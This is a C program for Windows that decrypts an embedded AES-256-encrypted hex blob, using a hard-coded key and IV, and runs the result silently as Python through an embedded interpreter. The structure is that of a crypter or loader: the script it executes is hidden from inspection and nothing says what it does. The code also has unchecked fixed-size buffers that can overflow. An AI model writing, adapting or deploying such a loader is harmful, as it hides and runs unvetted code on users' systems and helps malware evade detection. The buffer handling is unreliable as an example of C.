#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec616ff57313452c897f011cfc1ded2de268c9b9a0d027d35bf08909ca738bcb33fd633d4d9c3cc3a59ac284f9a1e4786fb10a1b57505199264b649e000a47c5a18ec1c19ceaa4d6bafe61474a3c2e69d03432039f40d6025cf9f430005a917dca24db2641d5172d0411d93b83b2fcbc3c083bd998777aca9adb76da7b2c6db0ccaec09a3542ca28abe0f29a5c9aed5e99fb68d6358f23f21685c491af90c6a59c3f2addcdb3e3e29527fd07c39c56b8e12411a5e72567c4a8babb2261d42c4f688e75eba8a66128e60627c9e5c6f0bbb98550b7027a79aaca5d3c27c8bf74e190d7fc834e77395644670a4b1e2bc381e3b679a1cc8e2bb24b92cc361afeb2d15ade0379fce5c1f9dd4bda93695526c452acfbc0fbad7a95e02542fc7ad9add9128485693d31f0f785f3cc8d20ee4655b4de4140cb577eb1a2c4325b0eb87e3760223f807b7e7ee56286ea431a5231ebe04bca8f126c76ea701495e4daa2bdf13a044e082ce9bde725c1e2df874e624ef85f446907e34eaa8bcd84502060540f21f2e88786187443de4c2bf8196d8d7b4aeb1b2d5ae4f2d15ecc4bcb9e631ee93ea12694b8c2788d326a1a4d1310eec2fab32f7519589188fe7a9b4a05b197eaaefda693a6234b73e2f3829e478f33b549d1e5bd56b225fda888d97add4eac93b519cde297ca2e84c198db80cb9bccf216236bb14f1f652c11fa1a6b28c949d4a3fa582099dc0ce894ab1c4d3e30d20cc357dd32865f36c93706b591bd29877697e6bf3961d5cc7cf62b1b4d59d3467f1169b75f84a34989bd875e707331ea55e401d2ed05b82554cd47f80f485f91074bfc52717d234184f921d663a8e66e3f24d6645cb80c37d86d7a4fe3f2a4a4774b2a039fd655447aec6f80925c4bb590799a25e7d7ea80a5e9a7456a05db8992805dab5eb74e8b2bbd16fd508cfc800c351978f141d3a4eac10b828708f8682d36fceae5e727fbb6e6402467bcaefa0a9c7aff861d6361128f0e8fef3b1389a40a9874fb79e02f628bcba87daf83da276670711a035c3d6a4404d3c3c3a05b5724b95adb60fd725005020375f5faf18dc5988da5a6ed665e26b644c8e7d2a6c1d3f165ce254e2d29db69a554b8a1d357fa9ca5b8bf8d46c2a8da9274a03f983fa7299c6b4e4cd89c6c27a6dee8072a42225e8129131b36d646c32117eba0a4cf2746f4eba38426364b230660f90ec0c26e527fe56ea1cfa241a3c5c1bb8fb8756e7a12061234d973eecbfeda20d04f0c49adfe1757c1914e296f573e7e3fa09f01c792295e5eca9551c828f301825df9c44b75b32cde9a99e5c7bafaed2b1832b35a8fa43ce4f45d41360c6ded29a5598ce92b49ec17afdb9a8c7d44f2b3a9d8d76d5e7456d9804dd40b41e2c3c5dfb7d0917e42c4e1ee883915e10bccf3d939ad49a18302012f4a8e8841ebdfebfe83f23a7aba315424bac5b28349fcfe0fad04ac0c0562d5bd85fb9c017d74674773a2e443cf21ae4a80b5daa7bf1ac32f2d0b1a901076c44fc39e4a6b0a067821c2eca8e7a5c59b8e56edc824eb35435613e6affc2323ba2a8083b576b33b2fc14ec155b9a36459eff18594c62a843046bc23bc678810b59ac5d8939e03373c528a1f27bbba3f01103f2f0a97d6183cceb858d76d887507ad7cf1f194847aa1db82a7c78dfc0d3624d74041728307a5ce42b578a06f8cfee4828a170a97f766de1c67b745f087e973ad810e4ff4b1137155a92e53e06730ae356aa198f8edc770b9a88c973df39608393aa6b256976f4fc1835ee049aee95872c779ef205ffe925d19e4f2e662322442859d9dfdaf2fc6749b2613adaad01a9f29fdaf6c105509c6fcac1d313c1ad25f1002cc02e8d38579ed9c276b99610b4f854c7e2445206898ee543ae224a12f9518f51259e205aa5a00e85ac7e908719bf76c876b49325b8d3c60f6de4cfe9b28380984b90ddb1a9ea15490f2938a131795f1447edfe8c0a3e9d4abd603354c83b8da63841f304491bb0e9639c0f89a77f0528dfd9962da308aa81d2e3c8fdbb59e3b7daa62dbc05e3fb28488309879f2569ed2b80867962b9619832d9b3c3281b72f290b32d5f0faca828";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypted_len = 0;


    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
